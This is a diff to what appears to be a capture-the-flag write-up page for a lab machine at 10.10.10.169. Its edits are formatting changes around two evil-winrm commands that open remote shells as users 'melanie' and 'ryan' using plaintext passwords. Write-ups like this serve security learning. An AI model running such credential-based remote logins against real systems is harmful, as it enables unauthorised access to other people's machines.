@@ -153,12 +153,9 @@ Now we know that password fits to melanie user and we can WinRM to it.
 evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
 {% endhighlight %}
 
-  ....
+...
+And now Ryan
 
-
-And now ryan
-  {% highlight shell %}
+{% highlight shell %}
 evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'  
 {% endhighlight %}
-
-{% endfor %}
